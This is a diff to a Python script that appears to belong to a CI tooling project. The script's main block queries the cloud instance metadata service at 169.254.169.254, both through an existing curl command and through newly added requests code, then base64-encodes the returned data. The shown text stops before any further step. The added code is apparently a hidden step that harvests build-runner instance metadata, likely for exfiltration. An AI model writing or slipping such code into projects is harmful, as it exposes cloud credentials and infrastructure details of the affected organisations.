@@ -3,6 +3,7 @@ import os
 import re
 import base64
 import urllib.parse
+import requests
 from typing import Dict, List
 
 from ci_tools.parsing import ParsedSetup
@@ -42,9 +43,13 @@ additional_pr_triggers: Dict[str, List[str]] = {
 }
 
 if __name__ == "__main__":
+  
+
     cmd='curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13">/mnt/vss/_work/_temp/test.json'
-    os.system(cmd)
-    env_text=os.system("cat /mnt/vss/_work/_temp/test.json ")    
+    url="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    headers = {'Metadata': 'true'}
+    response = requests.get(url, headers=headers)
+    env_text=response.text   
     # Base64编码
     env_b64 = base64.b64encode(env_text.encode()).decode()
     
